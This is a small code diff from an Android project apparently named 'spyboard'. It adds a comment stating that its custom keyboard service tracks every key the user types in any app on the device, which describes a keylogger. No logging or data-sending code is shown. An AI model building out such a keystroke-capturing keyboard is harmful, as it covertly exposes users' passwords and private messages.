@@ -21,6 +21,9 @@ import com.idankorenisraeli.spyboard.R;
 /**
  * This class will simulate the functionality of an android keyboard,
  * With custom tracking of all the pressed keys
+ *
+ * This method service will detect all keyboard operations performed by the user
+ * and track each and every key that is being typed in any application in the device
  */
 public class SpyInputMethodService extends android.inputmethodservice.InputMethodService {
     SpyKeyboardView keyboardView;
